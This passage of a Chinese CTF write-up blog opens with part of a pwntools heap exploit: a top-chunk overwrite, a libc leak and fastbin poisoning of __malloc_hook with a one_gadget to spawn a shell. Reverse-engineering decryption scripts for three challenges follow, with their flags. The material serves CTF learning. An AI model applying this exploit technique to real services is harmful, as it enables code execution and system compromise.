class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">i</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;content:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:&#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">size,content</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;content:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;name.&#x27;</span>,<span class="string">&#x27;adadawdawdawfwewfwe&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">edit(<span class="number">0x70</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span>+p64(<span class="number">0x0f91</span>))</span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">choice(<span class="number">2</span>)</span><br><span class="line">libc_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">1640</span>-<span class="number">0x10</span>-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_addr: &#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">one=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">choice(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">0x10</span>,p64(libc_addr+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x13</span>)+p64(libc_addr+one[<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">choice(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;content:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x20</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><h4 id="asm-re"><a href="#asm-re" class="headerlink" title="asm_re"></a>asm_re</h4><p>一开始还想还原这个ida工程文件hhh，发现根本做不到，后面纯看arm汇编代码，直接手撕就好，加密逻辑在这儿，密文一开始还找半天，后面发现应该是存在变量unk_100003F10里面</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716107133474-6dd6bd70-f747-4e79-82d0-bd71353915ef-172838808283489.png" alt="img" data-caption="img" loading="lazy"></p>
<p>搓出脚本之后也还是卡了一小会儿，最后反应过来大小端的问题，改一下小端就好了，爆破一下直接出</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">k = [</span><br><span class="line">    <span class="number">0x1fd7</span>, <span class="number">0x21b7</span>, <span class="number">0x1e47</span>, <span class="number">0x2027</span>, <span class="number">0x26e7</span>, <span class="number">0x10d7</span>, <span class="number">0x1127</span>, <span class="number">0x2007</span>,</span><br><span class="line">    <span class="number">0x11c7</span>, <span class="number">0x1e47</span>, <span class="number">0x1017</span>, <span class="number">0x1017</span>, <span class="number">0x11f7</span>, <span class="number">0x2007</span>, <span class="number">0x1037</span>, <span class="number">0x1107</span>,</span><br><span class="line">    <span class="number">0x1f17</span>, <span class="number">0x10d7</span>, <span class="number">0x1017</span>, <span class="number">0x1017</span>, <span class="number">0x1f67</span>, <span class="number">0x1017</span>, <span class="number">0x11c7</span>, <span class="number">0x11c7</span>,</span><br><span class="line">    <span class="number">0x1017</span>, <span class="number">0x1fd7</span>, <span class="number">0x1f17</span>, <span class="number">0x1107</span>, <span class="number">0x0f47</span>, <span class="number">0x1127</span>, <span class="number">0x1037</span>, <span class="number">0x1e47</span>,</span><br><span class="line">    <span class="number">0x1037</span>, <span class="number">0x1fd7</span>, <span class="number">0x1107</span>, <span class="number">0x1fd7</span>, <span class="number">0x1107</span>, <span class="number">0x2787</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(k)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>): </span><br><span class="line">        <span class="keyword">if</span> (((j * <span class="built_in">ord</span>(<span class="string">&#x27;P&#x27;</span>) + <span class="number">0x14</span>) ^ <span class="built_in">ord</span>(<span class="string">&#x27;M&#x27;</span>)) + <span class="number">0x1e</span>) == k[i]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(j), end=<span class="string">&quot;&quot;</span>) </span><br><span class="line"><span class="comment">#flag&#123;67e9a228e45b622c2992fb5174a4f5f5&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="whereThel1b"><a href="#whereThel1b" class="headerlink" title="whereThel1b"></a>whereThel1b</h4><p>还真是第一次遇见这种，给了个so和一个py文件，一开始的想法是能不能给so解包之类的，因为py文件里面密文给了，就差一个加密逻辑，找了一大圈还是没找到，最后还是想到了调一下so文件，像调安卓那样</p>
<p>动调起来锁定出了两个函数，得知输入的数据先经过base64编码之后再进行的异或<img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716109884779-17e06c83-6fc5-4814-bd3c-48dc2b4e2d3b-172838808283491.png" alt="img" data-caption="img" loading="lazy"></p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716109932327-1f17bb8d-f10b-4e67-b587-873ccedb086b-172838808283493.png" alt="img" data-caption="img" loading="lazy"></p>
<p>加密逻辑知道了，但是不知道异或的值是什么，一开始以为是存在r18里面的，最后调了一下找不到规律，最后想到重新写一份密文输入，然后把加密之后的数据输出一下，前后异或得到所需异或的值，想办法输入一个输构造出经过base64编码之后长度为56的数</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716110117071-af6369b0-a2ff-4e9b-a55e-3bb343104144-172838808283495.png" alt="img" data-caption="img" loading="lazy"></p>
<p>exp:</p>
<p>其中aa是上图构造的“55555555555555555555555555555555555555555555”的base64之后的值，然后bb是运行上图之后得到的异或之后的值，最后运行出来的结果解一下base64就行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">encry = [<span class="number">108</span>, <span class="number">117</span>, <span class="number">72</span>, <span class="number">80</span>, <span class="number">64</span>, <span class="number">49</span>, <span class="number">99</span>, <span class="number">19</span>, <span class="number">69</span>, <span class="number">115</span>, <span class="number">94</span>, <span class="number">93</span>, <span class="number">94</span>, <span class="number">115</span>, <span class="number">71</span>, <span class="number">95</span>, <span class="number">84</span>, <span class="number">89</span>, <span class="number">56</span>, <span class="number">101</span>, <span class="number">70</span>, <span class="number">2</span>, <span class="number">84</span>, <span class="number">75</span>, <span class="number">127</span>, <span class="number">68</span>, <span class="number">103</span>, <span class="number">85</span>, <span class="number">105</span>, <span class="number">113</span>, <span class="number">80</span>, <span class="number">103</span>, <span class="number">95</span>, <span class="number">67</span>, <span class="number">81</span>, <span class="number">7</span>, <span class="number">113</span>, <span class="number">70</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">92</span>, <span class="number">124</span>, <span class="number">93</span>, <span class="number">120</span>, <span class="number">104</span>, <span class="number">108</span>, <span class="number">106</span>, <span class="number">17</span>, <span class="number">80</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">75</span>, <span class="number">93</span>, <span class="number">68</span>, <span class="number">121</span>, <span class="number">26</span>]</span><br><span class="line"></span><br><span class="line">aa = [<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>]</span><br><span class="line">bb = [<span class="number">120</span>, <span class="number">76</span>, <span class="number">101</span>, <span class="number">9</span>, <span class="number">84</span>, <span class="number">86</span>, <span class="number">69</span>, <span class="number">17</span>, <span class="number">81</span>, <span class="number">77</span>, <span class="number">103</span>, <span class="number">4</span>, <span class="number">93</span>, <span class="number">74</span>, <span class="number">67</span>, <span class="number">20</span>, <span class="number">67</span>, <span class="number">116</span>, <span class="number">93</span>, <span class="number">35</span>, <span class="number">70</span>, <span class="number">100</span>, <span class="number">83</span>, <span class="number">22</span>, <span class="number">125</span>, <span class="number">68</span>, <span class="number">119</span>, <span class="number">28</span>, <span class="number">125</span>, <span class="number">114</span>, <span class="number">92</span>, <span class="number">34</span>, <span class="number">72</span>, <span class="number">122</span>, <span class="number">81</span>, <span class="number">7</span>, <span class="number">101</span>, <span class="number">65</span>, <span class="number">75</span>, <span class="number">18</span>, <span class="number">72</span>, <span class="number">66</span>, <span class="number">78</span>, <span class="number">37</span>, <span class="number">105</span>, <span class="number">124</span>, <span class="number">88</span>, <span class="number">18</span>, <span class="number">80</span>, <span class="number">72</span>, <span class="number">98</span>, <span class="number">16</span>, <span class="number">94</span>, <span class="number">87</span>, <span class="number">102</span>, <span class="number">18</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(aa)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(((aa[i]^bb[i]))^encry[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#ZmxhZ3s3ZjlhMmQzYy0wN2RlLTExZWYtYmU1ZS1jZjFlODg2NzRjMGJ9</span></span><br></pre></td></tr></table></figure>

<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716110388906-19b8d9e8-944d-4754-abc1-bb32539cf928-172838808283497.png" alt="img" data-caption="img" loading="lazy"></p>
<h4 id="gdb-debug"><a href="#gdb-debug" class="headerlink" title="gdb_debug"></a>gdb_debug</h4><p>进入主函数之后逻辑还是相当清楚的，锁定了一下伪随机数</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716108171134-d0c78cae-29d9-40d8-98cb-2cc66768bf09-172838808283499.png" alt="img" data-caption="img" loading="lazy"></p>
<p>动调跑起来取出随机数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xd9</span>, <span class="number">0x0f</span>, <span class="number">0x18</span>, <span class="number">0xBD</span>, <span class="number">0xC7</span>, <span class="number">0x16</span>, <span class="number">0x81</span>, <span class="number">0xbe</span>, <span class="number">0xf8</span>, <span class="number">0x4A</span>, <span class="number">0x65</span>, <span class="number">0xf2</span>, <span class="number">0x5D</span>, <span class="number">0xab</span>, <span class="number">0x74</span>, <span class="number">0x33</span>, <span class="number">0xd4</span>, <span class="number">0xa5</span>, <span class="number">0x67</span>, <span class="number">0x98</span>, <span class="number">0x9f</span>, <span class="number">0x7E</span>, <span class="number">0x2B</span>, <span class="number">0x5D</span>, <span class="number">0xc2</span>, <span class="number">0xaf</span>, <span class="number">0x8e</span>, <span class="number">0x3A</span>, <span class="number">0x4C</span>, <span class="number">0xa5</span>, <span class="number">0X75</span>, <span class="number">0X25</span>, <span class="number">0xb4</span>, <span class="number">0x8d</span>, <span class="number">0xe3</span>, <span class="number">0X7B</span>, <span class="number">0xa3</span>, <span class="number">0x64</span></span><br></pre></td></tr></table></figure>

<p>然后直接从后往前逆就好</p>
<p>exp:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> indexArray[<span class="number">38</span>];</span><br><span class="line">    <span class="type">int</span> buffer[<span class="number">38</span>];</span><br><span class="line">    <span class="type">int</span> outputBuffer[<span class="number">38</span>];</span><br><span class="line">    <span class="type">int</span> originalNumbers[] = &#123;</span><br><span class="line">        <span class="number">94</span>, <span class="number">30</span>, <span class="number">2</span>, <span class="number">68</span>, <span class="number">157</span>, <span class="number">32</span>, <span class="number">134</span>, <span class="number">99</span>, <span class="number">227</span>, <span class="number">214</span>,</span><br><span class="line">        <span class="number">182</span>, <span class="number">105</span>, <span class="number">24</span>, <span class="number">193</span>, <span class="number">153</span>, <span class="number">168</span>, <span class="number">188</span>, <span class="number">5</span>, <span class="number">121</span>, <span class="number">159</span>,</span><br><span class="line">        <span class="number">25</span>, <span class="number">110</span>, <span class="number">218</span>, <span class="number">76</span>, <span class="number">117</span>, <span class="number">174</span>, <span class="number">192</span>, <span class="number">185</span>, <span class="number">247</span>, <span class="number">122</span>,</span><br><span class="line">        <span class="number">149</span>, <span class="number">77</span>, <span class="number">23</span>, <span class="number">135</span>, <span class="number">148</span>, <span class="number">84</span>, <span class="number">191</span>, <span class="number">185</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> byteSequence[] = &#123;</span><br><span class="line">        <span class="number">128</span>, <span class="number">180</span>, <span class="number">64</span>, <span class="number">184</span>, <span class="number">148</span>, <span class="number">200</span>, <span class="number">52</span>, <span class="number">101</span>, <span class="number">238</span>, <span class="number">69</span>,</span><br><span class="line">        <span class="number">215</span>, <span class="number">157</span>, <span class="number">60</span>, <span class="number">136</span>, <span class="number">140</span>, <span class="number">169</span>, <span class="number">107</span>, <span class="number">174</span>, <span class="number">125</span>, <span class="number">135</span>,</span><br><span class="line">        <span class="number">214</span>, <span class="number">135</span>, <span class="number">15</span>, <span class="number">218</span>, <span class="number">70</span>, <span class="number">100</span>, <span class="number">57</span>, <span class="number">147</span>, <span class="number">169</span>, <span class="number">144</span>,</span><br><span class="line">        <span class="number">184</span>, <span class="number">113</span>, <span class="number">131</span>, <span class="number">232</span>, <span class="number">172</span>, <span class="number">201</span>, <span class="number">231</span>, <span class="number">83</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> shuffledIndices[<span class="number">38</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">38</span>; i++) &#123;</span><br><span class="line">        shuffledIndices[i] = originalNumbers[i] ^ byteSequence[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> encryptionKeys[] = &#123;<span class="number">0xd9</span>, <span class="number">0x0f</span>, <span class="number">0x18</span>, <span class="number">0xBD</span>, <span class="number">0xC7</span>, <span class="number">0x16</span>, <span class="number">0x81</span>, <span class="number">0xbe</span>, <span class="number">0xf8</span>, <span class="number">0x4A</span>, <span class="number">0x65</span>, <span class="number">0xf2</span>, <span class="number">0x5D</span>, <span class="number">0xab</span>, <span class="number">0x74</span>, <span class="number">0x33</span>, <span class="number">0xd4</span>, <span class="number">0xa5</span>, <span class="number">0x67</span>, <span class="number">0x98</span>, <span class="number">0x9f</span>, <span class="number">0x7E</span>, <span class="number">0x2B</span>, <span class="number">0x5D</span>, <span class="number">0xc2</span>, <span class="number">0xaf</span>, <span class="number">0x8e</span>, <span class="number">0x3A</span>, <span class="number">0x4C</span>, <span class="number">0xa5</span>, <span class="number">0x75</span>, <span class="number">0x25</span>, <span class="number">0xb4</span>, <span class="number">0x8d</span>, <span class="number">0xe3</span>, <span class="number">0x7B</span>, <span class="number">0xa3</span>, <span class="number">0x64</span>&#125;;</span><br><span class="line">    <span class="type">int</span> permutationOrder[] = &#123;<span class="number">33</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">31</span>, <span class="number">10</span>, <span class="number">29</span>, <span class="number">9</span>, <span class="number">24</span>, <span class="number">26</span>, <span class="number">11</span>, <span class="number">20</span>, <span class="number">24</span>, <span class="number">21</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> dataXor[] = &#123;<span class="number">0xBF</span>, <span class="number">0xD7</span>, <span class="number">0x2E</span>, <span class="number">0xDA</span>, <span class="number">0xEE</span>, <span class="number">0xA8</span>, <span class="number">0x1A</span>, <span class="number">0x10</span>, <span class="number">0x83</span>, <span class="number">0x73</span>, <span class="number">0xAC</span>, <span class="number">0xF1</span>, <span class="number">0x06</span>, <span class="number">0xBE</span>, <span class="number">0xAD</span>, <span class="number">0x88</span>, <span class="number">0x04</span>, <span class="number">0xD7</span>, <span class="number">0x12</span>, <span class="number">0xFE</span>, <span class="number">0xB5</span>, <span class="number">0xE2</span>, <span class="number">0x61</span>, <span class="number">0xB7</span>, <span class="number">0x3D</span>, <span class="number">0x07</span>, <span class="number">0x4A</span>, <span class="number">0xE8</span>, <span class="number">0x96</span>, <span class="number">0xA2</span>, <span class="number">0x9D</span>, <span class="number">0x4D</span>, <span class="number">0xBC</span>, <span class="number">0x81</span>, <span class="number">0x8C</span>, <span class="number">0xE9</span>, <span class="number">0x88</span>, <span class="number">0x78</span>&#125;;</span><br><span class="line">    <span class="type">char</span> inputData[] = <span class="string">&quot;congratulationstoyoucongratulationstoy&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">38</span>; i++) &#123;</span><br><span class="line">        indexArray[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">37</span>; k &gt; <span class="number">0</span>; --k) &#123;</span><br><span class="line">        <span class="type">int</span> swapIndex = permutationOrder[<span class="number">37</span> - k] % (k + <span class="number">1</span>);</span><br><span class="line">        <span class="type">int</span> tempIndex = indexArray[k];</span><br><span class="line">        indexArray[k] = indexArray[swapIndex];</span><br><span class="line">        indexArray[swapIndex] = tempIndex;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">38</span>; i++) &#123;</span><br><span class="line">        buffer[i] = shuffledIndices[i] ^ inputData[i] ^ dataXor[i];</span><br><span class="line">        outputBuffer[indexArray[i]] = encryptionKeys[indexArray[i]] ^ buffer[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">38</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, outputBuffer[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
    
  </article>

  
      

  
  
  <div class="nexmoe-post-meta nexmoe-rainbow">
   
    
        <a class="nexmoefont icon-tag-fill -none-link" href="/tags/CTF/" rel="tag">CTF</a>
    
</div>
  
  
    <script async src="/js/copy-codeblock.js?v=1729473845981"></script>
  

  
      <div class="nexmoe-post-footer">
          
      </div>
  
</div></div><div class="nexmoe-post-right">    <div class="nexmoe-fixed">
        <div class="nexmoe-tool">

            

            
            
            <button class="mdui-fab catalog" style="overflow:unset;">
                <i class="nexmoefont icon-i-catalog"></i>
                <div class="nexmoe-toc">
                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="toc-number">1.</span> <span class="toc-text">解题过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web"><span class="toc-number">1.1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Simple-php"><span class="toc-number">1.1.1.</span> <span class="toc-text">Simple_php</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#easycms-revenge"><span class="toc-number">1.1.2.</span> <span class="toc-text">easycms_revenge</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Misc"><span class="toc-number">1.2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%A7%E5%AD%A6%E7%94%9F%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%83%BD%E5%8A%9B%E8%B0%83%E7%A0%94%E9%97%AE%E5%8D%B7"><span class="toc-number">1.2.1.</span> <span class="toc-text">大学生安全测试能力调研问卷</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%81%AB%E9%94%85%E9%93%BE%E8%A7%82%E5%85%89%E6%89%93%E5%8D%A1"><span class="toc-number">1.2.2.</span> <span class="toc-text">火锅链观光打卡</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E9%A3%8E%E6%9C%BA"><span class="toc-number">1.2.3.</span> <span class="toc-text">通风机</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Power-Trajectory-Diagram"><span class="toc-number">1.2.4.</span> <span class="toc-text">Power Trajectory Diagram</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A5%9E%E7%A7%98%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.5.</span> <span class="toc-text">神秘文件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Crypto"><span class="toc-number">1.3.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#OvO"><span class="toc-number">1.3.1.</span> <span class="toc-text">OvO</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81"><span class="toc-number">1.3.2.</span> <span class="toc-text">古典密码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwn"><span class="toc-number">1.4.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#gostack"><span class="toc-number">1.4.1.</span> <span class="toc-text">gostack</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#orange-cat-diary"><span class="toc-number">1.4.2.</span> <span class="toc-text">orange_cat_diary</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reverse"><span class="toc-number">1.5.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#asm-re"><span class="toc-number">1.5.1.</span> <span class="toc-text">asm_re</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#whereThel1b"><span class="toc-number">1.5.2.</span> <span class="toc-text">whereThel1b</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#gdb-debug"><span class="toc-number">1.5.3.</span> <span class="toc-text">gdb_debug</span></a></li></ol></li></ol></li></ol>
                </div>
            </button>
            

            

            <a href="#nexmoe-content" class="backtop toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
        </div>
    </div>
</div></div><div id="nexmoe-footer"><!--!--></div><div id="nexmoe-search-space"><div class="search-container"><div class="search-header"><div class="search-input-container"><input class="search-input" type="text" placeholder="搜索" onInput="sinput();"></div><a class="search-close" onclick="sclose();">×</a></div><div class="search-body"></div></div></div><div><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2058306854838448" crossorigin="anonymous"></script>
</div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"left","width":350,"height":350},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body></html>